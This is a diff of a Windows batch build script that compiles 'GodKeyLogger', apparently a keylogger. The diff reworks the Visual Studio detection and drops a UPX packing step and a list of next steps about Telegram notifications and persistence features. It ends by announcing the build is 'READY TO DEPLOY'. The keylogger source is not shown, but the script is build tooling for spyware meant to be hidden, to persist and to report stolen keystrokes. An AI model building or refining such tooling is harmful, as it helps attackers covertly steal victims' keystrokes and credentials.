@@ -1,74 +1,67 @@
 @echo off
 echo ========================================
-echo    GOD KEYLOGGER - FINAL BUILD v2.0
+echo    GOD KEYLOGGER - SIMPLIFIED BUILD
 echo ========================================
 echo.
 
-:: Configuration
-set COMPILER=cl.exe
-set SOURCE=GodKeyLogger.cpp
-set OUTPUT=GodKeyLogger.exe
-set LIBS=user32.lib gdi32.lib advapi32.lib winhttp.lib crypt32.lib
-set FLAGS=/EHsc /Ox /W2 /DUNICODE /D_UNICODE /MT /std:c++17
+:: Check for Visual Studio 2022/2019
+set VSWHERE="%ProgramFiles(x86)%\Microsoft Visual Studio\Installer\vswhere.exe"
+set VSINSTALL=
 
-:: Check for Visual Studio
-where cl >nul 2>nul
-if %errorlevel% neq 0 (
-    echo [ERROR] Visual Studio Compiler not found!
+if exist %VSWHERE% (
+    for /f "usebackq tokens=*" %%i in (`%VSWHERE% -latest -property installationPath`) do set VSINSTALL=%%i
+)
+
+if "%VSINSTALL%"=="" (
+    echo [ERROR] Visual Studio not found!
     echo.
-    echo Please install:
-    echo 1. Visual Studio 2022 Build Tools OR
-    echo 2. Visual Studio Community Edition
+    echo Please install ONE of these:
+    echo 1. Visual Studio 2022 Build Tools
+    echo    https://visualstudio.microsoft.com/downloads/#build-tools-for-visual-studio-2022
     echo.
-    echo Download from: https://visualstudio.microsoft.com/
+    echo 2. Visual Studio 2022 Community
+    echo    https://visualstudio.microsoft.com/vs/community/
+    echo.
+    echo 3. Or run from "Developer Command Prompt for VS 2022"
     pause
     exit /b 1
 )
 
-:: Build command
-echo [1/3] Compiling GodKeyLogger.cpp...
-%COMPILER% %FLAGS% %SOURCE% /link /SUBSYSTEM:WINDOWS /OUT:%OUTPUT% %LIBS%
+echo [INFO] Found Visual Studio at: %VSINSTALL%
+
+:: Setup environment
+call "%VSINSTALL%\VC\Auxiliary\Build\vcvars64.bat"
+
+:: Build
+echo [1/2] Building GodKeyLogger.cpp...
+cl.exe /EHsc /Ox /W2 /DUNICODE /D_UNICODE /MT /std:c++17 ^
+  GodKeyLogger.cpp ^
+  /link /SUBSYSTEM:WINDOWS /OUT:GodKeyLogger.exe ^
+  user32.lib gdi32.lib advapi32.lib winhttp.lib crypt32.lib
 
 if %errorlevel% neq 0 (
-    echo [ERROR] Compilation failed!
+    echo [ERROR] Build failed!
     pause
     exit /b 1
 )
 
 :: Verify
-echo [2/3] Verifying executable...
-if exist %OUTPUT% (
-    for %%F in (%OUTPUT%) do (
-        set size=%%~zF
-    )
+echo [2/2] Verifying executable...
+if exist GodKeyLogger.exe (
+    for %%F in (GodKeyLogger.exe) do set size=%%~zF
     echo [SUCCESS] Build completed!
-    echo [INFO] File: %OUTPUT%
+    echo [INFO] File: GodKeyLogger.exe
     echo [INFO] Size: %size% bytes
-    echo [INFO] Time: %time%
+    echo [INFO] Build time: %date% %time%
 ) else (
-    echo [ERROR] Output file not created!
+    echo [ERROR] Output file not found!
     pause
     exit /b 1
 )
 
-:: Optional: UPX compression
-echo [3/3] Optional: Compressing with UPX...
-where upx >nul 2>nul
-if %errorlevel% equ 0 (
-    upx --best --ultra-brute %OUTPUT% >nul 2>&1
-    echo [INFO] UPX compression applied
-) else (
-    echo [INFO] UPX not found (optional step)
-)
-
 echo.
 echo ========================================
-echo    BUILD PROCESS COMPLETED SUCCESSFULLY
+echo    READY TO DEPLOY
 echo ========================================
-echo.
-echo Next steps:
-echo 1. Test on Windows system
-echo 2. Check Telegram notifications
-echo 3. Verify persistence features
 echo.
 pause
